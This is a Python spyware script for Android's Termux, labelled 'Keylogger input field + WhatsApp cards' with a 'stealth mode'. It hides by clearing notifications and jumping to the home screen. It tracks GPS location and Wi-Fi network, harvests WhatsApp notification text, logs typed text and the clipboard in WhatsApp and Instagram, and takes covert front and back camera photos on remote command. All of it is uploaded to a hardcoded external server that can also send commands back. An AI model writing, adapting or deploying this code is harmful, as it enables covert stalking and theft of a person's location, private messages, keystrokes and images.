import time
import subprocess
import json
import requests
import os
import uuid
import base64
from datetime import datetime

URL_SERVIDOR = "https://nexos-panel.onrender.com/update"
URL_UPLOAD_LOTE = "https://nexos-panel.onrender.com/api/upload_lote"
URL_PING = "https://nexos-panel.onrender.com/"
ARQUIVO_ID = os.path.expanduser("~/.nexos_device_id")

def run(cmd, timeout=5):
    try:
        r = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=timeout)
        return r.stdout.strip()
    except:
        return ""

def obter_id():
    if os.path.exists(ARQUIVO_ID):
        with open(ARQUIVO_ID) as f: return f.read().strip()
    novo = f"NX-{str(uuid.uuid4())[:6].upper()}"
    with open(ARQUIVO_ID, "w") as f: f.write(novo)
    return novo

DEVICE_ID = obter_id()

# ============================================
# MODO STEALTH
# ============================================
def ativar_stealth():
    run("am start -a android.intent.action.MAIN -c android.intent.category.HOME", timeout=3)
    run("termux-notification-remove --all", timeout=2)
    print("🥷 Modo Stealth ATIVADO\n")

print("\n" + "="*50)
print(f"🛰️  MOTOR NEXOS DUAL STREAM CARD OPERACIONAL")
print(f"🔑  SEU MONITOR ID DE PROD: {DEVICE_ID}")
print("="*50)
ativar_stealth()

ultima_lat = -16.6869
ultima_lon = -49.2648
gps_ok = False
inicio = datetime.now()
ultimo_ping = 0
ultimo_whatsapp = 0
ultimo_keylog = 0
historico_msg = {}
msg_processadas = set()

def obter_rede():
    w = run("termux-wifi-connectioninfo")
    if w:
        try:
            i = json.loads(w)
            s = i.get("ssid","")
            if s and s != "<unknown ssid>": return f"WiFi: {s}"
        except: pass
    return "Dados Moveis"

def obter_gps():
    global ultima_lat, ultima_lon, gps_ok
    out = run("termux-location -p gps -r once", timeout=6)
    if out:
        try:
            d = json.loads(out)
            lat = d.get("latitude")
            lon = d.get("longitude")
            if lat and lon and float(lat) != 0 and float(lon) != 0:
                ultima_lat = float(lat)
                ultima_lon = float(lon)
                gps_ok = True
                return
        except: pass
    gps_ok = False

def obter_app_aberto():
    foco = run("dumpsys window | grep mCurrentFocus", timeout=3)
    if foco:
        foco_lower = foco.lower()
        if "whatsapp" in foco_lower: return "whatsapp"
        elif "instagram" in foco_lower: return "instagram"
    return "outro"

def obter_texto_digitado():
    """Captura texto que está sendo digitado no campo de texto ATIVO"""
    # Método 1: Pegar do input method (campo de texto focado)
    result = run("dumpsys input_method | grep -oP 'mComposingText=\K[^ ]*' | head -1", timeout=2)
    if result and len(result) > 1:
        return result[:200]
    
    # Método 2: Pegar texto do campo ativo via dumpsys
    result = run("dumpsys input_method | grep -E 'mCur.*text=' | head -1", timeout=2)
    if result and "text=" in result:
        try:
            texto = result.split("text=")[1].split(",")[0]
            if len(texto) > 1:
                return texto[:200]
        except: pass
    
    # Método 3: Clipboard (fallback)
    clip = run("termux-clipboard-get", timeout=2)
    if clip and len(clip) > 0 and len(clip) < 500:
        return clip[:200]
    
    return None

def obter_whatsapp():
    global ultimo_whatsapp, historico_msg, msg_processadas
    agora = time.time()
    if agora - ultimo_whatsapp < 8:
        return list(historico_msg.values())
    
    notif = run("termux-notification-list", timeout=5)
    if notif:
        try:
            dados = json.loads(notif)
            novas_msgs = False
            for n in dados:
                pkg = n.get("packageName", "")
                if "whatsapp" in pkg.lower():
                    pessoa = n.get("title", "WhatsApp")[:30]
                    texto = n.get("content", "")
                    msg_id = n.get("key", "") or f"{pessoa}_{texto[:50]}_{n.get('when','')}"
                    if msg_id in msg_processadas: continue
                    msg_processadas.add(msg_id)
                    novas_msgs = True
                    if len(msg_processadas) > 500: msg_processadas.clear()
                    
                    tem_midia = False; tipo_midia = ""
                    if any(x in texto.lower() for x in ["📷", "photo", "imagem"]): tem_midia = True; tipo_midia = "📷 Foto"
                    elif any(x in texto.lower() for x in ["🎥", "video", "vídeo"]): tem_midia = True; tipo_midia = "🎥 Vídeo"
                    elif any(x in texto.lower() for x in ["🎵", "audio", "áudio"]): tem_midia = True; tipo_midia = "🎵 Áudio"
                    elif any(x in texto.lower() for x in ["📎", "documento", "arquivo"]): tem_midia = True; tipo_midia = "📎 Arquivo"
                    elif any(x in texto.lower() for x in ["figurinha", "sticker"]): tem_midia = True; tipo_midia = "😄 Figurinha"
                    
                    if tem_midia and not texto: texto = tipo_midia
                    elif tem_midia: texto = f"{tipo_midia}: {texto}"
                    
                    if pessoa not in historico_msg:
                        historico_msg[pessoa] = {"pessoa": pessoa, "mensagens": [], "ultima_msg": "", "total": 0, "midia": False}
                    historico_msg[pessoa]["mensagens"].append({"texto": texto[:150] if texto else "(sem texto)", "midia": tem_midia, "hora": datetime.now().strftime("%H:%M"), "tipo": "recebida"})
                    if len(historico_msg[pessoa]["mensagens"]) > 30: historico_msg[pessoa]["mensagens"] = historico_msg[pessoa]["mensagens"][-30:]
                    historico_msg[pessoa]["ultima_msg"] = texto[:80]
                    historico_msg[pessoa]["total"] = len(historico_msg[pessoa]["mensagens"])
                    historico_msg[pessoa]["midia"] = tem_midia
            
            if novas_msgs: run("termux-notification-remove --all", timeout=3)
            ultimo_whatsapp = agora
        except: pass
    return list(historico_msg.values())

def obter_keylog():
    global ultimo_keylog, historico_msg
    agora = time.time()
    if agora - ultimo_keylog < 3:
        return None
    
    app = obter_app_aberto()
    texto = obter_texto_digitado()
    
    if app in ["whatsapp", "instagram"] and texto:
        ultimo_keylog = agora
        
        # Adiciona como mensagem ENVIADA na conversa
        destino = "Conversa"  # Nome genérico
        if destino not in historico_msg:
            historico_msg[destino] = {"pessoa": destino, "mensagens": [], "ultima_msg": "", "total": 0, "midia": False}
        
        # Verifica se não é duplicata
        if not historico_msg[destino]["mensagens"] or historico_msg[destino]["mensagens"][-1]["texto"] != texto[:150]:
            historico_msg[destino]["mensagens"].append({
                "texto": texto[:150],
                "midia": False,
                "hora": datetime.now().strftime("%H:%M"),
                "tipo": "enviada"
            })
            if len(historico_msg[destino]["mensagens"]) > 30:
                historico_msg[destino]["mensagens"] = historico_msg[destino]["mensagens"][-30:]
            historico_msg[destino]["ultima_msg"] = f"📤 {texto[:80]}"
            historico_msg[destino]["total"] = len(historico_msg[destino]["mensagens"])
        
        return {"app": app, "ativo": True, "texto": texto[:200], "tipo": "enviada", "timestamp": datetime.now().strftime("%H:%M:%S")}
    
    ultimo_keylog = agora
    return None

def executar_comando(acao):
    if acao == "vibrar": run("termux-vibrate -d 1000", timeout=3)
    elif acao == "som": run("termux-media-player play scan", timeout=3)
    elif acao == "lanterna": run("termux-torch on", timeout=3); time.sleep(2); run("termux-torch off", timeout=3)
    elif acao == "stealth": ativar_stealth()

def enviar_dados(payload):
    json_str = json.dumps(payload).replace("'", "'\\''")
    cmd = f"curl -s -X POST '{URL_SERVIDOR}' -H 'Content-Type: application/json' -d '{json_str}' --connect-timeout 5 --max-time 5"
    resp = run(cmd, timeout=6)
    try: return json.loads(resp)
    except: return None

def capturar_foto(num, arquivo):
    if os.path.exists(arquivo): os.remove(arquivo)
    try:
        subprocess.run(f"termux-camera-photo -c {num} {arquivo}", shell=True, timeout=6)
        time.sleep(1.5)
        if os.path.exists(arquivo) and os.path.getsize(arquivo) > 100:
            with open(arquivo, "rb") as f: return base64.b64encode(f.read()).decode('utf-8')
    except: pass
    return None

def enviar_lote(front_b64, back_b64):
    if not front_b64 and not back_b64: return False
    try:
        r = requests.post(URL_UPLOAD_LOTE, json={"device_id": DEVICE_ID, "photo_front": front_b64 or "", "photo_back": back_b64 or ""}, timeout=20)
        return r.status_code == 200
    except: return False

print("🛰️  INICIADO v4.1 (Keylogger input field + WhatsApp cards)\n")

while True:
    t0 = time.time()
    
    if time.time() - ultimo_ping > 240:
        run(f"curl -s -o /dev/null --connect-timeout 10 --max-time 15 {URL_PING}", timeout=12)
        ultimo_ping = time.time()
    
    bat = "N/A"
    out = run("termux-battery-status")
    if out:
        try: bat = str(json.loads(out).get("percentage", "N/A"))
        except: pass
    
    obter_gps()
    rede = obter_rede()
    msgs_whats = obter_whatsapp()
    keylog = obter_keylog()
    
    payload = {
        "device_id": DEVICE_ID, "battery": bat,
        "uptime": str(datetime.now() - inicio).split('.')[0],
        "lat": ultima_lat, "lon": ultima_lon,
        "network": rede, "whatsapp": msgs_whats, "keylog": keylog
    }
    
    resp = enviar_dados(payload)
    dt = time.time() - t0
    
    if resp and resp.get("status") == "success":
        cmd_cam = resp.get("comando_cam", "wait")
        cmd_remoto = resp.get("comando_remoto", "none")
        
        # Terminal enxuto
        partes = [f"🥷 {datetime.now().strftime('%H:%M:%S')} Bat:{bat}% {rede}"]
        if keylog and keylog.get("texto"): partes.append(f"⌨️{keylog['texto'][:25]}")
        if msgs_whats: partes.append(f"💬{len(msgs_whats)}")
        print(" | ".join(partes) + f" | {dt:.1f}s")
        
        if cmd_remoto != "none": executar_comando(cmd_remoto)
        
        if cmd_cam == "take_dual":
            arq_tras = os.path.expanduser("~/nexos_back.jpg")
            arq_front = os.path.expanduser("~/nexos_front.jpg")
            b64_tras = capturar_foto(0, arq_tras)
            time.sleep(0.3)
            b64_front = capturar_foto(1, arq_front)
            if b64_tras or b64_front:
                enviar_lote(b64_front, b64_tras)
            for a in [arq_tras, arq_front]:
                if os.path.exists(a): os.remove(a)
    
    time.sleep(2.0)
